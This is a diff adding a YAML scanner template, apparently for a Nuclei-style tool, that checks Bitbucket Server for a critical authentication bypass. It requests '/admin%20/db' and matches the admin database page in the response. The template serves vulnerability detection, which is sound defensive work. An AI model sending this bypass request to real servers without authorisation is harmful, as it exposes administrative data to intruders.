@@ -1,0 +1,31 @@
+id: "bitbucket-auth-bypass"
+name: "Bitbucket Server > 4.8 - Authentication Bypass"
+severity: "critical"
+description: "There is a permission bypass vulnerability through %20, which allows arbitrary users to obtain sensitive data"
+tech:
+  - "generic"
+tags:
+  - "misconfig"
+  - "atlassian"
+  - "bitbucket"
+  - "auth-bypass"
+  - "vuln"
+reference: "https://github.com/Threekiii/Awesome-POC/blob/master/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Atlassian%20Bitbucket%20%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E.md"
+spaExclusion: true
+request:
+  method: "GET"
+  path: "/admin%20/db"
+control:
+  method: "GET"
+  path: "/.guardian-none-{{rand}}"
+matchers-condition: "and"
+matchers:
+  - type: "word"
+    part: "body"
+    words:
+      - "<h2>Database</h2>"
+      - "Migrate database"
+    condition: "and"
+  - type: "status"
+    status:
+      - 200
